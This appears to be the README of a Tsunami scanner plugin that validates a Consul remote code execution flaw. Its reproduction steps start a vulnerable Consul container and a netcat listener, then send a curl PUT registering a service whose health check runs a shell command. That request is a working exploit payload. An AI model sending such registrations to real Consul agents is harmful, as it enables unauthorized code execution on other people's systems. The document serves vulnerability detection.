# Consul RCE Validator

* https://www.exploit-db.com/exploits/46074
* https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations

## RCE Reproduction steps

```
docker run --name consul --net host  consul:1.2.3 consul agent -dev -enable-script-checks --bind=127.0.0.1
```

In one terminal:
```
netcat -l 5555
```

In another:
```
curl -H 'Content-Type: application/json' -X PUT \
    -d '{
        "ID": "test",
        "Name": "test",
        "Address": "127.0.0.1",
        "Port": 80,
        "check": {
            "script": "curl localhost:5555/test",
            "Args": ["sh", "-c", "curl localhost:5555/test"],
            "interval": "10s",
            "Timeout": "86400s"
        }
    }' localhost:8500/v1/agent/service/register
```

Make sure to teardown: `docker rm -f consul`

## Build jar file for this plugin

Using `gradlew`:

```shell
./gradlew jar
```

Tsunami identifiable jar file is located at `build/libs` directory.
